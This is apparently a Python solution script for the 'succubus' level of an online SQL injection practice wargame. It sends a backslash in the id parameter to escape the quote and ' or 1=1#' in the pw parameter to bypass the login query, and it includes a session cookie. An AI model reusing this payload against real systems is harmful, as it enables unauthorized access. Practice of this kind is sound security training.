import requests

cookies = {"PHPSESSID": "hnqqnd0kksjcna51oknp9s2b4s"}

url = "https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php"

# select id from prob_succubus where id='\' and pw=' or id=admin#'

params = {"id": "\\", "pw": " or 1=1#"}

r = requests.get(url, params=params, cookies=cookies)
print(r.text)